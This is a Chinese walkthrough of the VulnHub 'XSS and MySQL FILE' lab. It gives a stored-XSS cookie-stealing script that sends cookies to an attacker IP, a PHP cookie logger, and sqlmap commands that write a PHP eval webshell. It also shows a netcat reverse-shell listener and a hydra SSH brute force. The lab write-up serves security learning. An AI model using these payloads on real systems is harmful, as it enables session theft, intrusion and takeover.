## 一 前言

想试试xss的利用方式和学习更多的提权方法，在vulnhub找到了该靶机，以为会很简单，没想到还是做了挺久的，下面是我在做题的一些详细思路，希望能给新人们一些帮助。有不对的地方欢迎大佬们斧正！

 **靶机：** http://www.vulnhub.com/entry/pentester-lab-xss-and-mysql-file,66/

下载以及搭建就不复述了，网上很多教程。

## 二 步骤

### 1 信息收集

查询靶机IP地址

nmap 192.168.8.254/24 (192.168.8.254可以为你kali的ip，同网段就可以)

![](https://image.3001.net/images/20220527/1653664594_6290eb520c45f1a79c141.png!small)

查找所有目录

dirb <http://192.168.8.130>

![1653664666_6290eb9a4388dac481c53.png!small?1653664667931](https://image.3001.net/images/20220527/1653664666_6290eb9a4388dac481c53.png!small?1653664667931)

### 2 漏洞分析拿到管理员权限

查看ip地址

![1653664717_6290ebcdec9b725e6c03d.png!small?1653664718049](https://image.3001.net/images/20220527/1653664717_6290ebcdec9b725e6c03d.png!small?1653664718049)

点击test发现有个留言板（一般可能为xss），直接先输入,点击提交有弹窗，之后再访问又有弹窗知道是存储型xss

![1653664746_6290ebea1f9fc17053e30.png!small?1653664746216](https://image.3001.net/images/20220527/1653664746_6290ebea1f9fc17053e30.png!small?1653664746216)

加入自定义获取cookie的cookie.php文件并保存在www（ **要保证www文件夹有写权限，不然会没有cookie写入** ）

    
    
    <?php
    $cookie =$_GET['cookie'];
    $log = fopen("cookie.txt", "a");
    fwrite($log, $cookie . "\n");
    fclose($log);
    ?>

之后添加下面语句到留言板访问cookie.php文件，这句话的意思是访问10.61.171.251下的cookie.php文件,参数cookie传递访问者的cookie，然后cookie.php文件访问者的cookie1保存到cookie.txt文件

    
    
    <script>document.location.href='http://10.61.171.251/cookie.php?cookie='+document.cookie</script>  
    //（ IP地址为你文件存放的ip地址）

点击welcome抓包，现在的cookie是你本机的cookie

![1653665005_6290eced01df415393903.png!small?1653665005340](https://image.3001.net/images/20220527/1653665005_6290eced01df415393903.png!small?1653665005340)

之后放包再抓包，这里为什么还是11呢，因为document.cookie是谁访问就会显示谁的cookie，这里是本机访问所以显示本机的cookie

![1653704976_629189105b63c7280b070.png!small?1653704975341](https://image.3001.net/images/20220528/1653704976_629189105b63c7280b070.png!small?1653704975341)

那我们要怎么拿到管理员的cookie呢，这个需要管理员去访问，这个靶机设置管理员一段时间会自动访问，因此每隔一段时间就会显示管理员的cookie，去cookie.txt文件查看

![1653665216_6290edc0811195979d3bf.png!small?1653665216845](https://image.3001.net/images/20220527/1653665216_6290edc0811195979d3bf.png!small?1653665216845)

之后便在应用里更改文件里收到的cookie值，然后访问/admin就可以得到管理员权限

![1653665310_6290ee1e4601a7fc0c50b.png!small?1653665310390](https://image.3001.net/images/20220527/1653665310_6290ee1e4601a7fc0c50b.png!small?1653665310390)

访问到管理员页面

![1653665334_6290ee3613d5480fb32fe.png!small?1653665334456](https://image.3001.net/images/20220527/1653665334_6290ee3613d5480fb32fe.png!small?1653665334456)

 **注：**
这里的cookie删除机制有问题，可能是cookie一段时间有效，就算管理员登录切换了cookie，原先的cookie还是可以让你登录管理员页面

### 3 getshell

按edit发现了id段，可能可以利用sql，尝试闭合

![1653665395_6290ee7358893db855b77.png!small?1653665395655](https://image.3001.net/images/20220527/1653665395_6290ee7358893db855b77.png!small?1653665395655)

输入'，报错，确实存在注入点,也得到一个目录路径（后面有用到），mysql_fetch_assoc()的参数是数据指针

![1653665455_6290eeaf42d0af7818ef9.png!small?1653665455398](https://image.3001.net/images/20220527/1653665455_6290eeaf42d0af7818ef9.png!small?1653665455398)

 **sqlmap**

发现有sql注入点，就用sqlmap扫描

sqlmap -u <http://192.168.8.132/admin/edit.php?id=1>-cookie
PHPSESSID=9rlsf1ue91h4et0cps81oqdgj4

查找sql注入的类型以及mysql等的信息收集

![1653665606_6290ef464ba1a46e398f3.png!small?1653665606992](https://image.3001.net/images/20220527/1653665606_6290ef464ba1a46e398f3.png!small?1653665606992)

在kali写一个一句话木马文件（位置：/root/Desktop/1.php）

    
    
    <?php eval($_POST['x']);?>

payload:

    
    
    sqlmap -u http://192.168.8.132/admin/edit.php?id=1 -cookie PHPSESSID=9rlsf1ue91h4et0cps81oqdgj4 -p id --file-write="/root/Desktop/1.php" --file-dest="/var/www/classes/pp.php"

 **\--file-write** 为kali的保存文件 **\--file-dest** 为你想写入的靶机文件路径

写入一句话木马文件1.php到classes目录，发现没有写入权限

![1653665891_6290f0639dab9c5b56ba0.png!small?1653665891830](https://image.3001.net/images/20220527/1653665891_6290f0639dab9c5b56ba0.png!small?1653665891830)

又重新扫描dirb <http://192.168.8.130>，发现有个css路径

![1653665914_6290f07a68cc896789a6e.png!small?1653665914530](https://image.3001.net/images/20220527/1653665914_6290f07a68cc896789a6e.png!small?1653665914530)

重新插入，发现插入成功

    
    
    sqlmap -u http://192.168.8.132/admin/edit.php?id=1 -cookie PHPSESSID=9rlsf1ue91h4et0cps81oqdgj4 -p id --file-write="/root/Desktop/1.php" --file-dest="/var/www/css/pp.php"

![1653665976_6290f0b8a44c09ed76ec5.png!small?1653665976857](https://image.3001.net/images/20220527/1653665976_6290f0b8a44c09ed76ec5.png!small?1653665976857)

菜刀成功连接

![1653666008_6290f0d8e77ddc46ecaf0.png!small?1653666009086](https://image.3001.net/images/20220527/1653666008_6290f0d8e77ddc46ecaf0.png!small?1653666009086)

### 4 提权

上面我菜刀连接的时候将文件x参数改为cmd，你们可以将下面的cmd自行换为x。

 **为什么要提权？**

虽然sql注入漏洞利用的页面我们看到是root用户，但是之后我们查看到我们现在是www-data用户（默认情况下Web服务器（例如Apache，nginx）使用的用户），因此需要提权

![1653666045_6290f0fd0e460b01c8f1d.png!small?1653666045521](https://image.3001.net/images/20220527/1653666045_6290f0fd0e460b01c8f1d.png!small?1653666045521)

kali开监听nc -lvp 5555

建立一个反弹shell，post值为

![1653666067_6290f11351c7822228230.png!small?1653666067371](https://image.3001.net/images/20220527/1653666067_6290f11351c7822228230.png!small?1653666067371)

之后在kali接收到

![1653666085_6290f1251163af2f26c5b.png!small?1653666085173](https://image.3001.net/images/20220527/1653666085_6290f1251163af2f26c5b.png!small?1653666085173)

访问/etc/passwd文件，发现有跟root一样的bash

![1653666108_6290f13c107697f485875.png!small?1653666108620](https://image.3001.net/images/20220527/1653666108_6290f13c107697f485875.png!small?1653666108620)

尝试su root和user发现不行

![1653666133_6290f155f04b4ccd87689.png!small?1653666134387](https://image.3001.net/images/20220527/1653666133_6290f155f04b4ccd87689.png!small?1653666134387)

之后本来想跟上次的靶场一样在passwd目录里面添加用户，但发现没有权限（这个才是正常的，上次那个靶场是故意设置不是root用户也可以修改）

![1653666154_6290f16a7931895965ac6.png!small?1653666154674](https://image.3001.net/images/20220527/1653666154_6290f16a7931895965ac6.png!small?1653666154674)

竟然不行的话就用ssh远程登录，用hydra爆破user用户的密码

hydra -t 10 -l user -P /usr/share/wordlists/dirb/common.txt 192.168.8.132 ssh

![1653666196_6290f194523a4350121fa.png!small?1653666196461](https://image.3001.net/images/20220527/1653666196_6290f194523a4350121fa.png!small?1653666196461)

发现密码是live，用ssh连接,成功连接

![1653666309_6290f20530446c644f66f.png!small?1653666309673](https://image.3001.net/images/20220527/1653666309_6290f20530446c644f66f.png!small?1653666309673)

输入命令sudo -l，显示可以使用任何命令

![1653666795_6290f3eb21fd203ef9ae0.png!small?1653666795470](https://image.3001.net/images/20220527/1653666795_6290f3eb21fd203ef9ae0.png!small?1653666795470)

## 三 总结：

先进行信息收集，目录扫描，之后发现网页有xss和sql注入漏洞，利用xss得到cookie，sql注入进行木马文件上传get低权限的shell，之后反弹shell发现没有可以提权的方法（可能是我提权方式接触的少），之后就用hydra爆破ssh密码，然后远程登录提权。

